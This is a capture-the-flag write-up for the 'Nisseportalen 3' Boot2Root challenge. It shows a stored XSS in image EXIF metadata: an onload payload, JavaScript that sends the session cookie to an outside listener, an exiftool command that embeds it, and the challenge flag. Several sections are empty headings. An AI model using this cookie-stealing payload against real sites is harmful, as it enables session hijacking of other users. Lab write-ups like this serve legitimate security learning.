+++
title = 'Nisseportalen 3'
categories = ['Boot2Root']
date = 2024-12-15T13:35:38+01:00
scrollToTop = true
+++

## Challenge Name:

Nisseportalen 3

## Category:

Boot2Root

## Challenge Description:

Nissernes største ønske er en portal til deling af alle deres AI-genererede billeder aka Nisseportalen. Projektet er dog i fare efter Nissedevs utallige fiaskoer med både Dangerzone og Nissezonen.

Praktikantnissen har fået til opgave at redde Nisseportalen og få ryddet op i Nissedevs rod. Kan du hjælpe med at redde Nisseportalen og finde alle de sårbarheder, der må være, så projektet endelig kan blive gjort færdigt?

Men vær beredt, det er ikke til at sige hvad Nissedev har haft gang i...

[https://tryhackme.com/jr/nisseportalen2o24](https://tryhackme.com/jr/nisseportalen2o24)

## Approach

We pick up where we left off in [Nisseportalen 2](/nc3/boot2root/nisseportalen-2) and now have a foothold on the webapp.
We now have authenticated access to the webapp and therefore revisit all the previously identified pages!

### Enumeration

On /portal/list.php we can now see the previously identified images, in the billeder.txt file, being rendered.

![List of images](images/list.png)

Besides that we only have the /portal/upload.php page left to explore.

This is the part I spent the longest time on in the challenge, but ultimately I revisited the description, in which this phrase stood out to me:
"Projektet er dog i fare efter Nissedevs utallige fiaskoer med både Dangerzone og Nissezonen."
This indicted to me that there might be some "previous projects" to check out"!
I started out scanning for subdomains, without any luck, but then started searching for previous NC3 CTFs and discovered that the previous year's CTF had these challenges!
https://blog.danniranderis.dk/2021/12/16/danish-christmas-ctf-2021-by-nc3-police-intermediary-dangerzone-1-4/
https://nissen96.github.io/CTF-writeups/writeups/2022/NC3-CTF-2022/Nissezonen.html

After a thorough readthrough of the writeups I understood that with the help of XSS, we might be able to steal a session cookie and log in as an admin!

In order to achieve this, we need to Add a malicious payload to the image EXIF metadata and then upload the image to the webapp!

```bash
<img src='http://10.10.131.239:1337/hacked.jpg' oNlOaD="eval(atob('base64 encodeded payload here'))">
```

With the base64 encoded malicious payload:

```bash
var cookies = document.cookie ? encodeURIComponent(document.cookie) : 'nothing';
var my_endpoint = 'http://10.10.131.239:1337/cookie/' + cookies + '.jpg';
var my_img = '<img src=' + my_endpoint + '>';
document.write(my_img);
```

We can then use exiftool to add the payload to the image EXIF metadata

```bash
echo "var cookies = document.cookie ? encodeURIComponent(document.cookie) : 'nothing'; var my_endpoint = 'http://10.10.131.239:1337/cookie/' + cookies + '.jpg'; var my_img = '<img src=' + my_endpoint + '>'; document.write(my_img);" | base64

exiftool -comment="<img src='http://10.10.131.239:1337/1.jpg' oNlOaD=\"eval(atob('dmFyIGNvb2tpZXMgPSBkb2N1bWVudC5jb29raWUgPyBlbmNvZGVVUklDb21wb25lbnQoZG9jdW1lbnQuY29va2llKSA6ICdub3RoaW5nJzsgdmFyIG15X2VuZHBvaW50ID0gJ2h0dHA6Ly8xMC4xMC4xMzEuMjM5OjEzMzcvY29va2llLycgKyBjb29raWVICsgJy5qcGcnOyB2YXIgbXlfaW1nID0gJzxpbWcgc3JjPScgKyBteV9lbmRwb2ludCArICc+JzsgZG9jdW1lbnQud3JpdGUobXlfaW1nKTsK'))\">" hacked.jpg
```

### Exploitation

### Getting foothold on the webapp

### Getting third flag

Thanks to "" we can submit the third flag and move on to [Nisseportalen 4](/nc3/boot2root/nisseportalen-4)!

## Flag

```text
NC3{Flag3:N1553D3v_5yn32 DU_F0r7j3N3R_37_fl49}
```

## Reflections and Learnings
